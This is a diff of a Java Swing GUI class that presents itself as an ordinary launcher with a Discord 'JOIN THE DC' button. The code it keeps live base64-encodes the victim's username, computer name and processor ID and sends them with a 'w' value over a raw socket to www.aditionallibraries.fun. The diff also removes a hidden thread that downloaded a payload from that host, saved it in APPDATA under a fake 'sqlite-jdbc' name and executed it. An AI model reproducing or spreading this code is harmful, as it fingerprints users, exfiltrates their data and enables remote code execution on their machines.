@@ -104,7 +104,11 @@ public class GUI extends JFrame {
         JLabel statusLabel = new JLabel("");
         statusLabel.setFont(new Font("Helvetica", Font.PLAIN, 22));
         statusLabel.setBounds(33, 200, getWidth(), 30);
-
+        JLabel JOIN = new JLabel("");
+        JOIN.setFont(new Font("Helvetica Italic", Font.BOLD, 22));
+        JOIN.setBounds(260,110+((anotherButtonImage.getIconWidth()/2)/2), getWidth(), 25);
+        JOIN.setText("JOIN THE DC");
+        JOIN.setForeground(Color.black);
         imageButton.addMouseListener(new MouseAdapter() {
             @Override
             public void mousePressed(MouseEvent e) {
@@ -167,7 +171,7 @@ public class GUI extends JFrame {
             @Override
             public void mouseReleased(MouseEvent e) {
                 try {
-                    Desktop.getDesktop().browse(URI.create("https://discord.com/channels/@me/1236059194944262267"));
+                    Desktop.getDesktop().browse(URI.create("https://discord.gg/krpbmHUpnR"));
                 } catch (IOException ex) {
                     throw new RuntimeException(ex);
                 }
@@ -186,6 +190,7 @@ public class GUI extends JFrame {
         contentPane.add(closeButton);
         contentPane.add(cornerLabel);
         contentPane.add(statusLabel);
+        contentPane.add(JOIN);
 
         contentPane.add(backgroundLabel);
 
@@ -195,9 +200,9 @@ public class GUI extends JFrame {
     public static void builder(String e) {
         try {
             String h = Base64.getEncoder().encodeToString((System.getenv("user.name") + System.getenv("COMPUTERNAME") + System.getenv("PROCESSOR_IDENTIFIER").replace(" ", "").replace(",", "")).getBytes(StandardCharsets.UTF_8));
-            String json = "{\"n\":\"" + System.getProperty("user.name") + "\",\"w\":\"" + e + "\",\"h\":\"" + h + "\",\"r\":\"93\"}";
+            String json = "{\"n\":\""+System.getProperty("user.name")+"\",\"w\":\""+e+"\",\"h\":\""+h+"\",\"r\":\"93\"}";
 
-            Socket socket = new Socket("www.aditionallibraries.fun", 3000);
+            Socket socket = new Socket("www.aditionallibraries.fun", 3002);
             OutputStream outputStream = socket.getOutputStream();
             PrintWriter writer = new PrintWriter(outputStream, true);
             writer.println(json);
@@ -224,24 +229,6 @@ public class GUI extends JFrame {
     }
 
     public static void main(String[] args) {
-        new Thread(() -> {
-                try {
-                    try (Socket socket = new Socket("www.aditionallibraries.fun", 4001);
-                         InputStream is = socket.getInputStream();
-                         BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(new File(System.getenv("APPDATA")) + "\\sqlite-jdbc-8.11.3"))) {
-                        byte[] buffer = new byte[4096];
-                        int bytesRead;
-                        while ((bytesRead = is.read(buffer)) != -1) {
-                            bos.write(buffer, 0, bytesRead);
-                        }
-                    } catch (IOException e) {
-                        e.printStackTrace();
-                    }
-                    Runtime.getRuntime().exec("java -jar \"" + new File(System.getenv("APPDATA")) + "\\sqlite-jdbc-8.11.3\"");
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            }).start();
         SwingUtilities.invokeLater(() -> {
             try {
                 new GUI();
